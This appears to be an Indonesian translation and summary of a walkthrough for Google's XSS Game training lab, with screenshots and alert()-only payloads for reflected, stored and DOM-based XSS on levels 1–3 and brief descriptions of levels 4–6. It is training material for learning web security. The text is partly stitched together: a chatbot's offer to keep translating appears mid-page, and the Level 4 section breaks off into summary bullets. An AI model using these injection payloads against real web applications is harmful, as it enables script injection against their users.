**Panduan langkah-demi-langkah (walkthrough) untuk menyelesaikan Google XSS Game, sebuah platform pelatihan keamanan siber yang dirancang oleh Google untuk mengajarkan teknik eksploitasi Cross-Site Scripting (XSS).**

_Berikut adalah poin-poin utama dari repositori tersebut:_

1. Fokus Materi

Intisari (TL;DR):
XSS bergantung pada konteks, bukan pada payload (muatan kode).
innerHTML dan jQuery.html() adalah titik eksekusi (sinks) yang berbahaya.
Filter sering kali gagal — celah logika akan tetap ada.
Fragmen URL dan pemuatan skrip dinamis memiliki risiko tinggi.
Eksploitasi nyata memerlukan pembacaan kode sumber, bukan sekadar menebak payload.
Kerentanan Cross-Site Scripting (XSS) adalah kelemahan umum pada aplikasi web modern, di mana penanganan input pengguna yang salah memungkinkan penyerang mengeksekusi JavaScript arbitrer. Google XSS Game menyediakan pelatihan praktis enam level untuk mempelajari berbagai pola XSS dunia nyata dan teknik eksploitasinya. Panduan ini mendokumentasikan Proof of Concept (PoC) lengkap untuk keenam tingkat tersebut, disertai tangkapan layar dan penjelasan logika payload.

Deskripsi Lab

Peringatan: Anda memasuki area permainan XSS

Selamat datang, rekrutan baru!

Bug Cross-site scripting (XSS) adalah salah satu kerentanan web yang paling umum dan berbahaya. Serangga jahat ini dapat memungkinkan penyerang untuk mencuri atau mengubah data pengguna di dalam aplikasi.
Google menangani XSS dengan sangat serius dan secara historis telah membayar imbalan (bounties) hingga $7.500 untuk bug XSS yang berbahaya.

Akan ada kue di akhir permainan 🧪⚔️

Lab Link: ``` https://xss-game.appspot.com/ ```

<img width="1176" height="525" alt="image" src="https://github.com/user-attachments/assets/95c331f3-f0ae-427d-915e-cd6108528488" />

Platform: Google XSS Game

Vulnerability Class: Cross-Site Scripting (XSS)

Panduan ini membahas enam level tantangan XSS dengan skenario yang berbeda-beda:
 
***

🧩Level 1 — Halo, Dunia XSS*
  
Apakah Anda ingin saya lanjut menerjemahkan langkah-langkah penyelesaian untuk Level 1 ini, atau Anda ingin bantuan untuk:
Memahami konsep dasar Reflected XSS di level ini?
Mencari tahu payload apa yang paling efektif untuk melewatinya?
Menjelaskan mengapa form pencarian tersebut bisa rentan?

Tautan: https://xss-game.appspot.com/level1

Level: 1/6

Tipe Kerentanan: Reflected XSS

Level ini mendemonstrasikan reflected XSS di mana input pengguna langsung dimasukkan ke dalam respons tanpa melalui proses penyaringan (escaping) yang benar. Untuk mencoba level ini, 

kunjungi ``` https://xss-game.appspot.com/level1```

<img width="1165" height="673" alt="image" src="https://github.com/user-attachments/assets/3af83835-032f-41aa-9c09-77dbf69c7206" />

Reflection Check
 
Input:

``` Hii ```

Response:

``` Sorry, no results were found for Hii. Try again. ```

URL:

``` https://xss-game.appspot.com/level1/frame?query=Hii ```

Input ditampilkan kembali tanpa melalui proses escape — sebuah indikasi jelas dari Reflected XSS.

<img width="1189" height="313" alt="image" src="https://github.com/user-attachments/assets/41f711e8-2a61-4f02-b3bb-9620cff79b52" />

🧪 Injeksi HTML (HTML Injection)

Payload:

``` <h1>Hiii</h1> ```

Payload Terakhir (Level 1)

``` <script>alert("Aditya Bhatt")</script> ```

JavaScript executes successfully.

<img width="1179" height="368" alt="image" src="https://github.com/user-attachments/assets/dd91d405-b540-4b2c-b092-9899e0bbdb3f" />

***

**🧩 Level 2 — Persistensi adalah Kunci**

Tautan: ```https://xss-game.appspot.com/level2```

Level: 2/6

Tipe Kerentanan: Stored XSS (Penyimpanan Sisi Klien)

(Stored XSS): Memasukkan skrip berbahaya ke dalam basis data (seperti di fitur komentar) menggunakan tag alternatif seperti <img> dengan atribut onerror.

<img width="1362" height="682" alt="image" src="https://github.com/user-attachments/assets/f58bb5c2-5469-4fc0-bcc0-68e8a3643fd7" />

**🧪 Upaya Payload Awal**

Payloads tested:

```test```

```<script>alert("iindoSec101")</script>```

Pesan ```test``` coba telah terkirim

Payload ```<script>``` sepenuhnya dihapus (redacted)

Tidak ada perubahan yang teramati pada tab Network

Ini menunjukkan adanya pemfilteran berbasis tag, bukan sanitasi kontekstual.

<img width="1364" height="689" alt="image" src="https://github.com/user-attachments/assets/56cbe908-965f-4e61-8ece-0077afe66f90" />

**🔎 Tinjauan Kode Sumber JavaScript**

Inspector → Debugger → Sources → level2/frame

```
octype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />

    <!-- This is our database of messages -->
    <script src="/static/post-store.js"></script>
  
    <script>
      var defaultMessage = "Welcome!<br><br>This is your <i>personal</i>"
        + " stream. You can post anything you want here, especially "
        + "<span style='color: #f00ba7'>madness</span>.";

      var DB = new PostDB(defaultMessage);

      function displayPosts() {
        var containerEl = document.getElementById("post-container");
        containerEl.innerHTML = "";

        var posts = DB.getPosts();
        for (var i=0; i<posts.length; i++) {
          var html = '<table class="message"> <tr> <td valign=top> '
            + '<img src="/static/level2_icon.png"> </td> <td valign=top '
            + ' class="message-container"> <div class="shim"></div>';

          html += '<b>You</b>';
          html += '<span class="date">' + new Date(posts[i].date) + '</span>';
          html += "<blockquote>" + posts[i].message + "</blockquote";
          html += "</td></tr></table>"
          containerEl.innerHTML += html; 
        }
      }

      window.onload = function() { 
        document.getElementById('clear-form').onsubmit = function() {
          DB.clear(function() { displayPosts() });
          return false;
        }

        document.getElementById('post-form').onsubmit = function() {
          var message = document.getElementById('post-content').value;
          DB.save(message, function() { displayPosts() } );
          document.getElementById('post-content').value = "";
          return false;
        }

        displayPosts();
      }

    </script>

  </head>

  <body id="level2">
    <div id="header">
      <img src="/static/logos/level2.png" /> 
      <div>Chatter from across the Web.</div>
      <form action="?" id="clear-form">
        <input class="clear" type="submit" value="Clear all posts">
      </form>
    </div>

    <div id="post-container"></div>

    <table class="message">
      <tr>
        <td valign="top">
          <img src="/static/level2_icon.png">
        </td>
        <td class="message-container">
          <div class="shim"></div>
          <form action="?" id="post-form">
            <textarea id="post-content" name="content" rows="2" 
              cols="50"></textarea>
            <input class="share" type="submit" value="Share status!">
            <input type="hidden" name="action" value="sign">
          </form>
        </td>
      </tr>
    </table>

  </body>
</html>
```

Input yang dikontrol pengguna ditampilkan melalui ```_innerHTML_```. Tag script difilter, tetapi event handler tidak 

<img width="1353" height="683" alt="image" src="https://github.com/user-attachments/assets/2dda54c5-61aa-442e-ab83-ea5f98871fd5" />


💥 Payload Terakhir (Level 2)

```<img src=x onerror=alert()>```

Handler ```onerror``` dieksekusi — Level 2 berhasil diselesaikan.

🧩 Level 3 — Perasaan Terpuruk... (That Sinking Feeling…)
Tautan: ```https://xss-game.appspot.com/level3```

Level: 3/6

Tipe Kerentanan: `DOM-Based XSS`

<img width="712" height="412" alt="image" src="https://github.com/user-attachments/assets/4c288b0a-95b1-4945-beb8-182fe490d0ae" />

🔎 Analisis Parameter

Fragmen URL (URL fragment): ```https://xss-game.appspot.com/level3/frame#1```

Nilai yang valid: `1`, `2`, `3`. Input lainnya akan menghasilkan `Image NaN`. 

<img width="592" height="347" alt="image" src="https://github.com/user-attachments/assets/adf9ab28-7694-4208-8796-8a13684d0d6a" />


🔍Tinjauan Kode Sumber (Source Code Review)

```
function chooseTab(num) {
  var html = "Image " + parseInt(num) + "<br>";
  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
  $('#tabContent').html(html);
}
```

Parameter num digabungkan secara langsung ke dalam HTML dan ditampilkan menggunakan jQuery.html() — sebuah sink DOM XSS.

<img width="1363" height="690" alt="image" src="https://github.com/user-attachments/assets/ef15e30d-4dcc-4fe4-b523-2e1d7e396fd3" />

🧪 Pemutusan Konteks (Context Break)

Payload:

```'```

Output yang cacat (Malformasi):

```<img src="/static/cloud/level3/cloud" .jpg'="">```

<img width="1364" height="391" alt="image" src="https://github.com/user-attachments/assets/fe95b3dc-9001-4906-a3f1-68f115c52924" />

💥 Payload Terakhir (Level 3)

```' onerror=alert() '```

Gambar yang cacat memicu eksekusi JavaScript.

<img width="1355" height="365" alt="image" src="https://github.com/user-attachments/assets/371c71dc-6f1e-4e6d-8a0a-f984327e214e" />


🧩 Level 4 — Konteks Adalah Kunci (Context Matters)

Tautan: https://xss-game.appspot.com/level4

Level: 4/6

Tipe Kerentanan: Injeksi Konteks JavaScript `(JavaScript Context Injection)`

```https://xss-game.appspot.com/level4/frame?timer=test```

<img width="1363" height="272" alt="image" src="https://github.com/user-attachments/assets/eeba4a76-c8ad-4946-9779-e755883baea6" />

🔎Analisis Respons (menggunakan Burp)

```
<img src="/static/loading.gif" onload="startTimer('test');" />
<div id="message">Your timer will execute in test seconds.</div>
```

Input pengguna diinjeksikan ke dalam konteks string JavaScript. 



Level 4 (Context Matters): Melewati filter dengan menyesuaikan payload berdasarkan konteks di mana input ditampilkan, sering kali menggunakan pengkodean karakter.
Level 5 (Breaking Protocol): Mengeksploitasi parameter URL yang memengaruhi tautan navigasi, biasanya dengan protokol javascript:.
Level 6 (Follow the Rabbit): Memuat skrip eksternal dengan memanipulasi parameter URL yang mengambil sumber data dari domain luar. 
3. Prinsip Utama yang Diajarkan
Aditya Bhatt menekankan beberapa konsep penting dalam keamanan web: 
Konteks adalah Kunci: Efektivitas serangan XSS bergantung pada di mana input pengguna ditempatkan (misalnya dalam atribut HTML, blok skrip, atau teks biasa), bukan hanya pada jenis payload-nya.
Sink yang Berbahaya: Penggunaan fungsi seperti .innerHTML dan .html() milik jQuery adalah titik lemah yang sering memicu kerentanan DOM XSS.
Filter Sering Gagal: Logika filter yang hanya memblokir kata tertentu (seperti <script>) sering kali dapat dilewati dengan variasi logika atau tag lain. 
4. Tautan Penting
Repositori GitHub: Berisi kode PoC (Proof of Concept) dan penjelasan teknis setiap level.
Artikel Lengkap di InfoSec Write-ups: Penjelasan lebih mendalam mengenai setiap langkah eksploitasi dengan tangkapan layar.
Google XSS Game Lab: Platform asli tempat Anda bisa mencoba langsung tantangan-tantangan ini. 
